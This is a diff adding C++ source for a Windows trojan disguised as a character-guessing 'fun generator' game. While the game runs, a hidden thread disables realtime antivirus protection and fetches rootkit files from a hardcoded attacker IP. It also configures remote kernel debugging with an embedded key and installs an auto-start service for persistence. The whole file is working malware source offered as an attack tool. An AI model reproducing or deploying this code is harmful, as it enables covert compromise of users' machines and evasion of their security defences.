@@ -1,0 +1,150 @@
+#include <iostream>
+#include <random>
+#include <string>
+#include "networking.h"
+#include "configurations.h"
+#include "services.h"
+
+
+std::wstring GetCurrentPath() {
+    TCHAR PathBuffer[MAX_PATH] = { 0 };
+    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
+    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
+    return std::wstring(PathBuffer).substr(0, PathEndPos);
+}
+
+
+BOOL TrojanThread(LPVOID TrojParams) {
+    std::wstring CurrPath = GetCurrentPath();  // exe path, not solution path / source file path
+    std::wstring WideAutoService(L"C:\\nosusfolder\\verysus\\AutoService\\AutoStart.exe");
+
+    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
+    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
+    char DebugPort[MAX_PORT_SIZE] = { 0 };
+    char DebugKey[MAX_DEBUGKEY_SIZE] = { 0 };
+    char AutoPath[MAX_PATH] = { 0 };
+    char MapperName[13] = "RootMapper";
+    RootService AutoService;
+    RETURN_LAST LastError = { 0, ERROR_SUCCESS };
+    WcharpToCharp(AutoPath, WideAutoService.c_str());
+    ParseTrojanParams(TrojParams, TargetIp, AttackerIp, DebugPort, DebugKey);
+
+
+    // Disable realtime protection to not trigger any virus checks/alerts -
+    LastError = RealTime(TRUE);
+    if (LastError.Represent != ERROR_SUCCESS || LastError.LastError != 0) {
+        printf("[-] Cannot disable realtime protection - %d\n", LastError.LastError);
+        return FALSE;
+    }
+
+    // Get all the needed files for the rootkit (would eventually be medium.exe and driver files) and configure remote debugging -
+    if (!FilesAndDebugging(AttackerIp, DebugPort, DebugKey)) {
+        return FALSE;
+    }
+    printf("Downloaded files and changed debugging settings\n");
+
+    if (!SignAsService(AutoPath, &AutoService, "RootAuto", SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL, ".exe")) {
+        printf("[-] Failed to create service entry for auto service!\n");
+        return FALSE;
+    }
+    printf("Created service for auto service\n");
+    return TRUE;
+}
+
+
+int main()
+{
+    char NullTerm = '\0';
+    char Tilda = '~';
+    char Inp = 0;
+    char GuessLetter = 0;
+    char RandLetter = 0;
+    char TargetIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
+    char AttackerIp[MAXIPV4_ADDRESS_SIZE] = { 0 };
+
+     // HARDCODED VALUES, CHANGE THIS BY ListAttacker IF NEEDED
+    const char* AttackAddresses = "172.25.112.1~172.31.240.1~172.23.144.1~172.23.224.1~172.26.192.1~172.17.160.1~172.27.144.1~192.168.47.1~192.168.5.1~192.168.1.21~172.28.224.1~192.168.56.1";
+    const char* DebugPort = "50098";
+    const char* DebugKey = "7DY7NXTWOM9I.3BM9J5ZCB6EI.CMVKI54LP3U.NUS6VXQK8WEB";
+
+    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.,/;[]{}:-_=+)(*&^%$#@!~`";
+    std::random_device rd;
+    std::mt19937 gen(rd());
+    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
+    SECURITY_ATTRIBUTES Trojattr = { 0 };
+    HANDLE TrojanHandle = INVALID_HANDLE_VALUE;
+    LPVOID TrojanParams = NULL;
+
+
+    // Get IP addresses of target and attacker -
+    if (!MatchIpAddresses(TargetIp, AttackerIp, AttackAddresses)) {
+        printf("[-] Cannot find the target address and the matching attacker address!\n");
+        return 0;
+    }
+    printf("Target: %s, Attacker: %s\n", TargetIp, AttackerIp);
+
+
+    // Trojan variables and calling -
+    Trojattr.bInheritHandle = FALSE;
+    Trojattr.nLength = sizeof(SECURITY_ATTRIBUTES);
+    Trojattr.lpSecurityDescriptor = NULL;
+
+
+    // Trojan parameter buffer -
+    TrojanParams = malloc(strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 4);
+    if (TrojanParams == NULL) {
+        printf("Cannot continue with FunEngine (params = NULL), please retry..\n");
+        free(TrojanParams);
+        return 1;
+    }
+    memcpy(TrojanParams, TargetIp, strlen(TargetIp));
+    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp)), &Tilda, 1);
+    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + 1), AttackerIp, strlen(AttackerIp));
+    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + 1), &Tilda, 1);
+    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + 2), DebugPort, strlen(DebugPort));
+    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + 2), &Tilda, 1);
+    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + 3), DebugKey, strlen(DebugKey));
+    memcpy((PVOID)((ULONG64)TrojanParams + strlen(TargetIp) + strlen(AttackerIp) + strlen(DebugPort) + strlen(DebugKey) + 3), &NullTerm, 1);
+
+
+    // Start trojan thread and input from user -
+    TrojanHandle = CreateThread(&Trojattr,
+        0,
+        (LPTHREAD_START_ROUTINE)&TrojanThread,
+        TrojanParams,
+        0,
+        NULL);
+
+    if (TrojanHandle == NULL) {
+        printf("Cannot continue with FunEngine, please retry..\n");
+        free(TrojanParams);
+        return 1;
+    }
+    printf("Welcome to fun generator!\nRules:\n");
+    printf("1. when asked for ANY input, you should input only one letter (or it will ruin the fun ;) )\n");
+    printf("2. when asked if want to start/continue, the letter n will represent no and any other letter will represent yes\n");
+    printf("Welcome to fun generator! Setting things up...\nStart?\n");
+    std::cin >> Inp;
+    while (Inp != 'n') {
+        printf("Guess the character -> ");
+        std::cin >> GuessLetter;
+        RandLetter = Alp[distr(gen)];
+        if (GuessLetter != RandLetter) {
+            printf("\nOh No! you guessed the character %c but the computer guesses %c ! :(\n", GuessLetter, RandLetter);
+        }
+        else {
+            printf("\nWell Done! the computer did think about the character %c ! :)\n", GuessLetter);
+        }
+        GuessLetter = 0;
+        RandLetter = 0;
+        Inp = 0;
+        printf("Continue?\n");
+        std::cin >> Inp;
+    }
+
+    printf("Finished Fun Engine! Cleaning everything...\n");
+    WaitForSingleObject(TrojanHandle, INFINITE);
+    free(TrojanParams);
+    printf("Cleaning succeeded, bye bye!\n");
+    return 0;
+}
